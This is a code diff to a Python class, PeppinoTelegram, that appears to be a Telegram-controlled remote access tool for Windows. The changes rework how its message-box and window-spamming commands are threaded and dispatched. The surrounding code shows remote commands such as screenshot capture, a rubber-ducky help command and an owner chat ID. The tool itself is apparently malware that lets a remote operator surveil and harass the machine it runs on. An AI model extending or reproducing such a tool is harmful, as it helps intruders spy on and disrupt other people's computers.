@@ -533,6 +533,7 @@ class PeppinoTelegram:
             "duckyhelp":lambda: self.bsend(self.duckyhelp),
             "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
         }
+        self.no_background_functions = [self.message_box, self.spam_windows]
     
     def __send_image(self, image_name: str, caption=None) -> bool:
         try:
@@ -608,8 +609,10 @@ class PeppinoTelegram:
         except Exception as e:
             return self.bsend(f"Error while getting screenshot\n{e}")
 
-    def message_box(self, text: str, title: str="Warning", style=0x1000) -> None:
-        return ctypes.windll.user32.MessageBoxW(0, text, title, style)
+    def message_box(self, text: str, title: str = "Warning", style: int = 0x1000) -> int:
+        def run():
+            ctypes.windll.user32.MessageBoxW(0, text, title, style)
+        Thread(target=run, daemon=True).start()
 
     def spam_windows(self, n: int, text: str) -> None:
         for i in range(n):
@@ -1000,12 +1003,15 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         func = self.function_table.get(command)
         if func:
             try:
-                if function_args:
-                    thread_args = (function_args,)
-                    new_thread = Thread(target=func, args=thread_args)
+                if func in self.no_background_functions:
+                    func(*function_args)
                 else:
-                    new_thread = Thread(target=func)
-                new_thread.start()
+                    if function_args:
+                        thread_args = (function_args,)
+                        new_thread = Thread(target=func, args=thread_args)
+                    else:
+                        new_thread = Thread(target=func)
+                    new_thread.start()
             except TypeError as e:
                 self.bsend(f"Invalid args for function {command}\n{e}")
             except Exception as e:
